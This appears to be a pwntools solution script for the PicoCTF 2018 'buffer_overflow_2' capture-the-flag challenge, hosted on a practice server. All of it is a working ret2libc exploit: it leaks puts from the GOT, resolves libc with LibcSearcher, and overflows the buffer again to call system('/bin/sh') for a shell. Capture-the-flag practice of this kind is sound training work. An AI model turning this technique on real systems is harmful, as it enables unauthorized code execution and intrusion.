from pwn import *
from LibcSearcher import *

context.arch = 'i386'

elf = ELF('./PicoCTF_2018_buffer_overflow_2')
r = remote('node3.buuoj.cn', 26983)

r.recvline()
r.sendline(b'a' * 0x70 + flat([elf.plt['puts'], 0x8048646, elf.got['puts']]))
r.recvline()
puts_addr = u32(r.recv(4))
r.recvline()
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
exit_addr = libc_base + libc.dump('exit')
r.sendline(b'a' * 0x70 + flat([system_addr, exit_addr, bin_sh_addr]))
r.recvline()
r.interactive()
